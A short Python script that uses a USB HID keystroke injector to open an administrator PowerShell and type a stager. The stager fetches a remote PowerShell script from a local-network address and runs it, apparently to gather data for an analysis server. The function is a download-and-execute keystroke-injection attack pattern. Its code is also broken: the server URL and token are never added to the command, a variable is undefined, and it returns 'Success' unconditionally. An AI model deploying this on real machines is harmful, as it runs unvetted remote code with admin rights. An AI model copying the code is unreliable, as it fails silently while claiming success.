from hid.hid_keystroke_injector import open_admin_powershell, send_string, send_special_key
import time

def trigger_collection(hid_path='/dev/hidg0', analysis_server_url : str = None, time_range : int = 48, token: str = None):
    open_admin_powershell(hid_path=hid_path)
    
    time.sleep(1.0)
    
    stager_cmd = f'& ([scriptblock]::Create((Invoke-RestMethod -Uri "http://172.16.0.1:8000/windows/collector.ps1"))) -TimeRangeHours {time_range}'
    if analysis_server_url:
        stager_cmd.join(f' -ServerUrl "{analysis_server}"')
    if token:
         stager_cmd.join('-Token "{token}"')
    send_string(stager_cmd, delay=0.01, hid_path=hid_path)
    
    time.sleep(0.5)
    
    send_special_key('enter', hid_path=hid_path)
    time.sleep(1)

    return "Success"

